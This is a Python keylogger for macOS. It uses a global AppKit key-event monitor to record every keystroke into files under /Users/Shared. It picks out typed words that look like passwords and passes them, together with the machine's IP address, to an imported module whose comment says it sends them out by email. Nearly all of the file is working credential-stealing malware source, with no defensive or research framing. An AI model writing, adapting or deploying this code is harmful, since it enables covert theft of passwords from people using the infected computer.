# ====== KEYLOGGER ====== #


# == SETUP == #

# Modules
import os, sys # System
from AppKit import NSApplication, NSApp
from Foundation import NSObject
from Cocoa import NSEvent, NSKeyDownMask
from PyObjCTools import AppHelper
import TransferInfo # Subscript A
from PyQt5 import QtCore, QtWidgets
import keyboard as kb
import socket
import pathlib

# Create text files
f = open ("/Users/Shared/word.txt", "w")
f.write ('')
f.close ()

# Variables
Password = "" # Suspected password
word = "" # Current word
IP = "" # IP
Path = "/Users/Shared/"

# IP Retrieval
s = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
s.connect (("8.8.8.8", 80))
IP = s.getsockname()[0]
s.close ()

# Initial clearing [word.txt]
TransferInfo.erase ()


# == KEYLOGGING == #

class AppDelegate(NSObject):
    '''
    The App Delegate creates a mask to detect the key being pressed and adds
    a global monitor for this mask.
    '''
    def applicationDidFinishLaunching_(self, notification):
        mask_down = NSKeyDownMask
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(mask_down, key_handler)

class Writer:
    '''
    This class contains the methods necessary to create an output file and write
    the collected keystrokes to that file.
    '''
    
    # Setup
    def __init__(self):
        self.path = self.create_log()
        self.leng = 0

    # Create overall keylogging file
    def create_log(self):
        filepath = Path + "O_K.txt"
        f = open (filepath, 'w+')
        f.close()
        return filepath

    # Write to O_K file + Current Word file
    def write_to_log(self, value_char):
        self.leng += 1
        
        with open(Path + "O_K.txt", 'a') as f:
            f.write (value_char)

        with open (Path + "word.txt", 'a') as f:
            f.write (value_char)

w = Writer() # Variable simplication

def key_handler(event):
    '''
    Translates the key press events into readable characters if one exists
    the key code is also recorded for non-character input.
    '''
    try:
        capture_char = event.characters() # Key character [a]
        capture_raw = event.keyCode() # Key code [32]
        
        w.write_to_log (capture_char) # Append to O_K file
        
        if capture_raw == 51:
            with open(Path + "O_K.txt", 'rb+') as filehandle:
                filehandle.seek(-2, os.SEEK_END)
                filehandle.truncate()
            with open(Path + 'word.txt', 'rb+') as filehandle:
                filehandle.seek(-2, os.SEEK_END)
                filehandle.truncate()
        
        if capture_raw == 36 or capture_raw == 49: # Word is complete [Space/Enter pressed]
            # Determine completed word from text file
            f = open (Path + 'word.txt', 'r')
            word = str (f.read ())
            print (word)
            f.close ()

            # Password classification + identification
            rules = [lambda word: any(x.islower() for x in word),  # must have at least one lowercase
                lambda word: any(x.isdigit() for x in word),  # must have at least one digit
                lambda word: len(word) >= 7                   # must be at least 7 characters
                ]
            
            if all (rule (word) for rule in rules): # If word fits criteria
                Password = word # Set password
                TransferInfo.send (Password + '\n' + IP) # Send email through SendEmail.py

            TransferInfo.erase () # Erase word text file for new word
    except KeyboardInterrupt:
        AppHelper.stopEventLoop()

app = NSApplication.sharedApplication()
delegate = AppDelegate.alloc().init()
NSApp().setDelegate_(delegate)
AppHelper.runEventLoop()
